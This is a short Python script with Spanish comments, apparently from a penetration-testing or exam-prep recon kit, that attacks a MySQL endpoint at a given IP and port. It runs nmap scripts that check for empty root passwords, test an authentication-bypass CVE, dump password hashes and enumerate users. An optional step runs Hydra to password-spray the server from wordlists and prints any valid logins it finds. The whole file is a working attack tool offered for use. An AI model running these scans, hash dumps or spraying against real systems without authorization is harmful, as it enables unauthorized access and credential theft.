#!/usr/bin/env python
import subprocess
import sys
import argparse
import pathlib

# Documentación de Scripts NSE
# En ejecución:
# mysql-databases: intenta listar bases de datos. Usa contraseña vacía si no se provee.
# mysql-dump-hashes: extrae hashes para John the Ripper (requiere root)
# mysql-empty-password: comprueba si existen servidores MySQL con contraseña vacía para 'root' o 'anonymous'
# mysql-enum: enumeración de usuarios aprovechando comportamiento en versiones 5.x
# mysql-info: conecta y muestra protocolo, versión, hilo, estado, capacidades y salt de contraseña
# mysql-variables: muestra variables del servidor (requiere autenticación)
# mysql-vuln-cve2012-2122: omisión de autenticación en versiones hasta 5.1.61, 5.2.11, 5.3.5, 5.5.22

# No en ejecución:
# mysql-audit: audita configuración de seguridad frente al benchmark CIS MySQL 1.0.2
# mysql-brute: fuerza bruta contra MySQL
# mysql-query: ejecuta consultas y devuelve la tabla
def doNmap():
    print("INFO: Realizando escaneo de scripts MySQL con nmap para %s:%s" % (ip_address, port))
    try:
        subprocess.check_output(['nmap','-n','-sV','-Pn','-vv','-p',port,'--script=mysql-empty-password,mysql-vuln-cve2012-2122,mysql-databases,mysql-dump-hashes,mysql-enum,mysql-info,mysql-variables,vulners','-oA','%s/%s_%s_mysql' % (BASE,ip_address,port),ip_address],encoding='utf8')
    except Exception as e:
        print(type(e))
        print("Error desconocido en doNmap en mysqlrecon")

# Hydra configurado para spray rápido
def doHydra():
    print("INFO: Realizando escaneo MySQL con Hydra contra %s" % (ip_address))
    try:
        hydra_outfile = '%s/%s_%s_mysqlhydra.txt' % (BASE,ip_address,port)
        subprocess.check_output(['hydra','-L','/root/lists/userlist_sqlbrute.txt','-P','/root/lists/quick_password_spray.txt','-f','-o',hydra_outfile,'-u',ip_address,'-s',port,'mysql'])
        with open(hydra_outfile,'r') as h:
            for result in h:
                if "login:" in result:
                    print("[*] Credenciales MySQL válidas encontradas: %s" % (result))
    except subprocess.CalledProcessError as hydrerr:
        if hydrerr.returncode == 255:
            print("Hydra finalizó antes con código 255, ¡debe haber encontrado algo! Revisa mysqlhydra para ver la salida.")
        elif hydrerr.returncode != 0:
            print("Hydra falló:")
            print(hydrerr.returncode)
            print(hydrerr.output)
        else:
            print("INFO: No se encontraron credenciales MySQL válidas")

# Función mkdir_p actualizada para Python >= 3.5
def mkdir_p(path):
    pathlib.Path(path).mkdir(parents=True, exist_ok=True) 

if __name__=='__main__':
    parser = argparse.ArgumentParser(description='Script para verificar endpoints MySQL. Uso: mysqlrecon.py {opciones} <dirección_ip> <puerto>')
    parser.add_argument('ip_address', help="Dirección IP de la máquina objetivo")
    parser.add_argument('port', help="Puerto específico a enumerar")
    parser.add_argument('--hydra', default=False, action='store_true', dest='hydra', help="Especificar para ejecutar Hydra")
    args = parser.parse_args()

    ip_address = args.ip_address
    port = args.port

    BASE = '/root/scripts/recon_enum/results/exam/mysql'
    mkdir_p(BASE)

    doNmap()
    if args.hydra:
        doHydra()
